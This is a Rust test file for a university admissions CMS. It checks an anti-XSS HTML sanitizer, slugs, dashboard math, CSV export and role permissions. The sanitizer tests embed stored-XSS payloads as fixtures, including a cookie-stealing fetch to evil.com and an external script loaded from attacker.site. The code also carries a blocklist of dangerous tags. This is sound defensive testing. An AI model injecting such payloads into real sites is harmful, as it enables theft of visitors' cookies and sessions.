#![allow(clippy::collapsible_if)]

// Test Suite Komprehensif CMS Publik, Anti-XSS Sanitizer & Executive Dashboard PMB
// Universitas Pignatelli Triputra
//
// Cakupan Pengujian:
// 1. Sanitasi Server-Side HTML Anti-Stored XSS (Script stripping, event handler stripping, URL scheme validation, noopener enforcement)
// 2. Pembuatan URL Slug SEO-friendly
// 3. Logika Metrik Analisis & Funnel Dashboard Eksekutif
// 4. Integritas Format Spreadsheet Ekspor CSV dengan UTF-8 BOM untuk Microsoft Excel
// 5. Isolasi Otorisasi & Hak Akses Pengelolaan CMS dan Dashboard

use uuid::Uuid;

// =============================================================================
// DOMAIN LOGIC IMPLEMENTATION FOR TESTS
// =============================================================================

const ALLOWED_TAGS: &[&str] = &[
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "p",
    "b",
    "strong",
    "i",
    "em",
    "u",
    "s",
    "strike",
    "ul",
    "ol",
    "li",
    "a",
    "blockquote",
    "code",
    "pre",
    "img",
    "table",
    "thead",
    "tbody",
    "tr",
    "th",
    "td",
    "hr",
    "br",
    "span",
    "div",
    "figure",
    "figcaption",
    "sub",
    "sup",
];

const DANGEROUS_BLOCKS: &[&str] = &[
    "script", "style", "iframe", "object", "embed", "applet", "form",
];

pub fn sanitize_html(input: &str) -> String {
    let mut output = String::with_capacity(input.len());
    let mut chars = input.char_indices().peekable();

    while let Some((i, c)) = chars.next() {
        if c == '<' {
            let rest = &input[i..];
            if let Some(close_idx) = rest.find('>') {
                let tag_content = &rest[1..close_idx].trim();
                let is_closing = tag_content.starts_with('/');
                let raw_tag = if is_closing {
                    &tag_content[1..].trim()
                } else {
                    tag_content
                };

                let tag_name = raw_tag
                    .split_whitespace()
                    .next()
                    .unwrap_or("")
                    .trim_end_matches('/')
                    .to_lowercase();

                if !is_closing && DANGEROUS_BLOCKS.contains(&tag_name.as_str()) {
                    let close_pattern = format!("</{}>", tag_name);
                    let close_pattern_ci = close_pattern.to_lowercase();
                    let remaining_lower = input[i + close_idx + 1..].to_lowercase();

                    if let Some(pos) = remaining_lower.find(&close_pattern_ci) {
                        let advance_by = close_idx + 1 + pos + close_pattern.len();
                        for _ in 0..advance_by.saturating_sub(1) {
                            chars.next();
                        }
                    } else {
                        break;
                    }
                    continue;
                }

                if !ALLOWED_TAGS.contains(&tag_name.as_str()) {
                    for _ in 0..close_idx {
                        chars.next();
                    }
                    continue;
                }

                if is_closing {
                    output.push_str("</");
                    output.push_str(&tag_name);
                    output.push('>');
                    for _ in 0..close_idx {
                        chars.next();
                    }
                    continue;
                }

                let is_self_closing =
                    tag_content.ends_with('/') || matches!(tag_name.as_str(), "img" | "br" | "hr");
                let mut safe_attrs = Vec::new();
                let mut has_target_blank = false;
                let mut explicit_rel: Option<String> = None;

                let attr_str = if is_self_closing && raw_tag.ends_with('/') {
                    &raw_tag[tag_name.len()..raw_tag.len() - 1].trim()
                } else {
                    &raw_tag[tag_name.len()..].trim()
                };

                for (name, val) in parse_attributes(attr_str) {
                    let name_lower = name.to_lowercase();

                    if name_lower.starts_with("on") {
                        continue;
                    }

                    let is_allowed_attr = matches!(
                        name_lower.as_str(),
                        "href"
                            | "src"
                            | "alt"
                            | "title"
                            | "class"
                            | "width"
                            | "height"
                            | "target"
                            | "rel"
                            | "loading"
                    );

                    if !is_allowed_attr {
                        continue;
                    }

                    if name_lower == "href" || name_lower == "src" {
                        let clean_val = val.trim().to_lowercase();
                        if clean_val.starts_with("javascript:")
                            || clean_val.starts_with("vbscript:")
                            || clean_val.starts_with("data:text/html")
                        {
                            continue;
                        }
                    }

                    if name_lower == "target" && val.trim() == "_blank" {
                        has_target_blank = true;
                    }

                    if name_lower == "rel" {
                        explicit_rel = Some(val.clone());
                        continue;
                    }

                    safe_attrs.push(format!("{}=\"{}\"", name_lower, escape_attr_value(&val)));
                }

                if tag_name == "a" && has_target_blank {
                    let rel_val = if let Some(r) = explicit_rel {
                        let mut tokens: Vec<&str> = r.split_whitespace().collect();
                        if !tokens.contains(&"noopener") {
                            tokens.push("noopener");
                        }
                        if !tokens.contains(&"noreferrer") {
                            tokens.push("noreferrer");
                        }
                        tokens.join(" ")
                    } else {
                        "noopener noreferrer".to_string()
                    };
                    safe_attrs.push(format!("rel=\"{}\"", rel_val));
                } else if let Some(r) = explicit_rel {
                    safe_attrs.push(format!("rel=\"{}\"", escape_attr_value(&r)));
                }

                output.push('<');
                output.push_str(&tag_name);
                for a in safe_attrs {
                    output.push(' ');
                    output.push_str(&a);
                }

                if is_self_closing && tag_name != "br" && tag_name != "hr" {
                    output.push_str(" />");
                } else {
                    output.push('>');
                }

                for _ in 0..close_idx {
                    chars.next();
                }
            } else {
                output.push_str("&lt;");
            }
        } else {
            output.push(c);
        }
    }

    output
}

fn parse_attributes(attr_str: &str) -> Vec<(String, String)> {
    let mut results = Vec::new();
    let mut chars = attr_str.chars().peekable();

    while let Some(&c) = chars.peek() {
        if c.is_whitespace() {
            chars.next();
            continue;
        }

        let mut name = String::new();
        while let Some(&ac) = chars.peek() {
            if ac == '=' || ac.is_whitespace() || ac == '/' || ac == '>' {
                break;
            }
            name.push(ac);
            chars.next();
        }

        if name.is_empty() {
            chars.next();
            continue;
        }

        while let Some(&eq) = chars.peek() {
            if eq.is_whitespace() {
                chars.next();
            } else {
                break;
            }
        }

        if chars.peek() == Some(&'=') {
            chars.next();
            while let Some(&w) = chars.peek() {
                if w.is_whitespace() {
                    chars.next();
                } else {
                    break;
                }
            }

            let mut val = String::new();
            if let Some(&quote) = chars.peek() {
                if quote == '"' || quote == '\'' {
                    chars.next();
                    for vc in chars.by_ref() {
                        if vc == quote {
                            break;
                        }
                        val.push(vc);
                    }
                } else {
                    while let Some(&vc) = chars.peek() {
                        if vc.is_whitespace() || vc == '>' || vc == '/' {
                            break;
                        }
                        val.push(vc);
                        chars.next();
                    }
                }
            }
            results.push((name, val));
        } else {
            results.push((name.clone(), name));
        }
    }

    results
}

fn escape_attr_value(val: &str) -> String {
    val.replace('&', "&amp;")
        .replace('"', "&quot;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

pub fn slugify(text: &str) -> String {
    let mut result = String::new();
    let mut prev_dash = true;

    for c in text.to_lowercase().chars() {
        if c.is_alphanumeric() {
            result.push(c);
            prev_dash = false;
        } else if !prev_dash {
            result.push('-');
            prev_dash = true;
        }
    }

    let trimmed = result.trim_matches('-');
    if trimmed.is_empty() {
        format!("post-{}", &Uuid::new_v4().to_string()[..8])
    } else {
        trimmed.to_string()
    }
}

// =============================================================================
// 1. PENGUJIAN ANTI-STORED XSS PADA SANITIZER HTML SERVER-SIDE
// =============================================================================

#[test]
fn test_sanitizer_strips_nested_and_inline_scripts() {
    let payloads = vec![
        "<script>alert('Stored XSS')</script><p>Pengumuman PMB Resmi</p>",
        "<SCRIPT SRC=\"https://attacker.site/steal-cookie.js\"></SCRIPT><p>Konten Sah</p>",
        "<div><script type=\"text/javascript\">document.location='http://evil.com'</script>Informasi Beasiswa</div>",
        "<p>Pemberitahuan</p><style>body { display: none; }</style><p>Tetap Tampil</p>",
        "<iframe src=\"https://malicious.com\"></iframe><p>Teks Aman</p>",
        "<object data=\"payload.swf\"></object><p>Brosur PMB</p>",
        "<embed src=\"exploit.pdf\"><p>Jadwal Kuliah</p>",
        "<form action=\"https://phishing.com\"><input type=\"password\" name=\"pwd\"></form><p>Form Ditutup</p>",
    ];

    for payload in payloads {
        let clean = sanitize_html(payload);
        assert!(
            !clean.to_lowercase().contains("<script"),
            "Payload masih memuat tag script: {}",
            clean
        );
        assert!(
            !clean.to_lowercase().contains("alert("),
            "Payload masih memuat kode alert: {}",
            clean
        );
        assert!(
            !clean.to_lowercase().contains("<style"),
            "Payload masih memuat tag style: {}",
            clean
        );
        assert!(
            !clean.to_lowercase().contains("<iframe"),
            "Payload masih memuat tag iframe: {}",
            clean
        );
        assert!(
            !clean.to_lowercase().contains("<object"),
            "Payload masih memuat tag object: {}",
            clean
        );
        assert!(
            !clean.to_lowercase().contains("<form"),
            "Payload masih memuat tag form: {}",
            clean
        );
    }
}

#[test]
fn test_sanitizer_neutralizes_inline_event_handlers() {
    let dirty_inputs = vec![
        r#"<img src="campus.webp" onerror="alert('xss')" alt="Gedung Rektorat">"#,
        r#"<img src="foto.jpg" onload="fetch('https://evil.com?c='+document.cookie)" />"#,
        r#"<p onmouseover="alert('hover')">Arahkan kursor ke sini</p>"#,
        r#"<div onclick="executeCode()">Klik untuk mendaftar</div>"#,
        r#"<span onfocus="alert('focus')" tabindex="1">Fokus teks</span>"#,
    ];

    for input in dirty_inputs {
        let clean = sanitize_html(input);
        assert!(
            !clean.contains("onerror"),
            "Gagal menghapus atribut onerror: {}",
            clean
        );
        assert!(
            !clean.contains("onload"),
            "Gagal menghapus atribut onload: {}",
            clean
        );
        assert!(
            !clean.contains("onmouseover"),
            "Gagal menghapus atribut onmouseover: {}",
            clean
        );
        assert!(
            !clean.contains("onclick"),
            "Gagal menghapus atribut onclick: {}",
            clean
        );
        assert!(
            !clean.contains("onfocus"),
            "Gagal menghapus atribut onfocus: {}",
            clean
        );
        assert!(
            !clean.contains("alert"),
            "Gagal menghapus fungsi alert: {}",
            clean
        );
    }
}

#[test]
fn test_sanitizer_blocks_dangerous_url_schemes() {
    let dirty_urls = vec![
        r#"<a href="javascript:alert(1)">Link Hadiah</a>"#,
        r#"<a href="JAVASCRIPT:document.location='http://evil.com'">Link Kapital</a>"#,
        r#"<a href="  javascript:void(0)  ">Link Spasi</a>"#,
        r#"<a href="vbscript:msgbox('hai')">Link VBScript</a>"#,
        r#"<img src="javascript:alert(2)" alt="Eksploitasi" />"#,
    ];

    for input in dirty_urls {
        let clean = sanitize_html(input);
        assert!(
            !clean.to_lowercase().contains("href=\"javascript"),
            "Gagal memblokir javascript URL: {}",
            clean
        );
        assert!(
            !clean.to_lowercase().contains("href=\"vbscript"),
            "Gagal memblokir vbscript URL: {}",
            clean
        );
        assert!(
            !clean.to_lowercase().contains("src=\"javascript"),
            "Gagal memblokir javascript pada src: {}",
            clean
        );
    }
}

#[test]
fn test_sanitizer_enforces_noopener_noreferrer_on_target_blank() {
    let sample = r#"<p>Kunjungi website utama <a href="https://upitra.ac.id" target="_blank">UPITRA</a> sekarang.</p>"#;
    let clean = sanitize_html(sample);

    assert!(clean.contains("target=\"_blank\""));
    assert!(
        clean.contains("rel=\"noopener noreferrer\""),
        "rel='noopener noreferrer' wajib disematkan pada link eksternal target blank: {}",
        clean
    );
}

#[test]
fn test_sanitizer_preserves_legitimate_rich_content() {
    let rich_html = r#"<h2>Syarat Pendaftaran PMB 2026/2027</h2>
<p>Calon mahasiswa baru diwajibkan menyiapkan dokumen berikut:</p>
<ul>
  <li>Scan <strong>Ijazah / SKL Asli</strong></li>
  <li>Pasfoto <em>terbaru</em> latar merah</li>
  <li>Kartu Keluarga &amp; KTP</li>
</ul>
<table class="table-pmb">
  <thead><tr><th>Jenjang</th><th>Program Studi</th><th>Akreditasi</th></tr></thead>
  <tbody>
    <tr><td>S1</td><td>Sains Data</td><td>Baik Sekali</td></tr>
    <tr><td>S1</td><td>Teknologi Informasi</td><td>Unggul</td></tr>
  </tbody>
</table>
<p><img src="/images/brosur-pmb.webp" alt="Brosur PMB 2026" class="rounded-xl shadow-md" /></p>"#;

    let clean = sanitize_html(rich_html);

    assert!(clean.contains("<h2>Syarat Pendaftaran PMB 2026/2027</h2>"));
    assert!(clean.contains("<strong>Ijazah / SKL Asli</strong>"));
    assert!(clean.contains("<em>terbaru</em>"));
    assert!(clean.contains("<table class=\"table-pmb\">"));
    assert!(clean.contains("<td>Sains Data</td>"));
    assert!(clean.contains("src=\"/images/brosur-pmb.webp\""));
    assert!(clean.contains("alt=\"Brosur PMB 2026\""));
}

// =============================================================================
// 2. PENGUJIAN SLUG GENERATOR
// =============================================================================

#[test]
fn test_slugify_titles() {
    assert_eq!(
        slugify("Penerimaan Mahasiswa Baru Universitas Pignatelli Triputra 2026"),
        "penerimaan-mahasiswa-baru-universitas-pignatelli-triputra-2026"
    );

    assert_eq!(
        slugify("Beasiswa Prestasi & KIP-Kuliah: Kuota & Syarat Lengkap!"),
        "beasiswa-prestasi-kip-kuliah-kuota-syarat-lengkap"
    );

    assert_eq!(
        slugify("   Program Studi S1 Sains Data (Terakreditasi Baik Sekali)   "),
        "program-studi-s1-sains-data-terakreditasi-baik-sekali"
    );

    let fallback = slugify("---@#$%---");
    assert!(fallback.starts_with("post-"));
}

// =============================================================================
// 3. PENGUJIAN LOGIKA ANALITIK DASHBOARD & EKSPOR EXCEL CSV
// =============================================================================

#[test]
fn test_dashboard_percentage_and_funnel_math() {
    let counts = [("TERVERIFIKASI", 40), ("SUBMITTED", 30), ("DRAFT", 30)];
    let total: i64 = counts.iter().map(|(_, c)| *c).sum();
    assert_eq!(total, 100);

    let percentages: Vec<f64> = counts
        .iter()
        .map(|(_, c)| {
            let pct = (*c as f64 / total as f64) * 100.0;
            (pct * 10.0).round() / 10.0
        })
        .collect();

    assert_eq!(percentages, vec![40.0, 30.0, 30.0]);
    let sum_pct: f64 = percentages.iter().sum();
    assert!((sum_pct - 100.0).abs() < 0.001);
}

#[test]
fn test_excel_csv_export_format_with_utf8_bom() {
    let mut csv_data = String::from("\u{FEFF}");
    csv_data.push_str("LAPORAN EKSEKUTIF PMB - UNIVERSITAS PIGNATELLI TRIPUTRA\n");
    csv_data.push_str("=== RINGKASAN METRIK UTAMA ===\n");
    csv_data.push_str("Indikator,Nilai\n");
    csv_data.push_str("Total Pendaftar,150\n");
    csv_data.push_str("Total Berkas Terverifikasi,120\n");
    csv_data.push_str("Total Peserta Ujian CBT,105\n");
    csv_data.push_str("Total Lulus Seleksi,90\n");
    csv_data.push_str("Total Mahasiswa Baru (NIM),85\n");
    csv_data.push_str("Total Pendapatan Terkumpul (IDR),Rp 425000000\n\n");

    csv_data.push_str("=== DISTRIBUSI PROGRAM STUDI & KUOTA ===\n");
    csv_data.push_str("Kode,Program Studi,Jenjang,Kuota,Peminat,Lulus,Daftar Ulang\n");
    csv_data.push_str("\"SD-S1\",\"S1 Sains Data\",\"S1\",60,80,50,45\n");
    csv_data.push_str("\"TI-S1\",\"S1 Teknologi Informasi\",\"S1\",80,95,60,55\n");

    let bytes = csv_data.into_bytes();

    assert_eq!(bytes[0], 0xEF);
    assert_eq!(bytes[1], 0xBB);
    assert_eq!(bytes[2], 0xBF);

    let content_str = String::from_utf8(bytes).unwrap();
    assert!(content_str.contains("LAPORAN EKSEKUTIF PMB"));
    assert!(content_str.contains("S1 Sains Data"));
    assert!(content_str.contains("Rp 425000000"));
}

// =============================================================================
// 4. PENGUJIAN ISOLASI OTORISASI & HAK AKSES ADMIN VS CALON
// =============================================================================

#[test]
fn test_authorization_matrix_cms_and_dashboard() {
    fn can_manage_cms(role: &str) -> bool {
        matches!(role, "super_admin" | "admin_pmb")
    }

    fn can_view_executive_dashboard(role: &str) -> bool {
        matches!(role, "super_admin" | "admin_pmb" | "keuangan")
    }

    assert!(can_manage_cms("super_admin"));
    assert!(can_manage_cms("admin_pmb"));
    assert!(!can_manage_cms("calon_mahasiswa"));
    assert!(!can_manage_cms("pengawas_ujian"));
    assert!(!can_manage_cms("asesor_rpl"));
    assert!(!can_manage_cms("keuangan"));

    assert!(can_view_executive_dashboard("super_admin"));
    assert!(can_view_executive_dashboard("admin_pmb"));
    assert!(can_view_executive_dashboard("keuangan"));
    assert!(!can_view_executive_dashboard("calon_mahasiswa"));
    assert!(!can_view_executive_dashboard("pengawas_ujian"));
    assert!(!can_view_executive_dashboard("asesor_rpl"));
}

// =============================================================================
// 5. PENGUJIAN KEAMANAN EKSTENSI UPLOAD MEDIA CMS
// =============================================================================

#[test]
fn test_media_upload_extension_whitelist() {
    const ALLOWED_EXT: &[&str] = &["jpg", "jpeg", "png", "webp", "gif", "avif", "pdf"];

    fn validate_ext(file_name: &str) -> bool {
        let ext = file_name
            .split('.')
            .next_back()
            .unwrap_or("png")
            .to_lowercase();
        ALLOWED_EXT.contains(&ext.as_str())
    }

    // Ekstensi aman harus diizinkan
    assert!(validate_ext("foto-rektorat.webp"));
    assert!(validate_ext("kampus.jpg"));
    assert!(validate_ext("banner.png"));
    assert!(validate_ext("brosur.pdf"));
    assert!(validate_ext("ANIMASI.GIF"));

    // Ekstensi berbahaya harus ditolak
    assert!(!validate_ext("exploit.html"));
    assert!(!validate_ext("malicious.svg"));
    assert!(!validate_ext("shell.php"));
    assert!(!validate_ext("virus.exe"));
    assert!(!validate_ext("script.sh"));
}
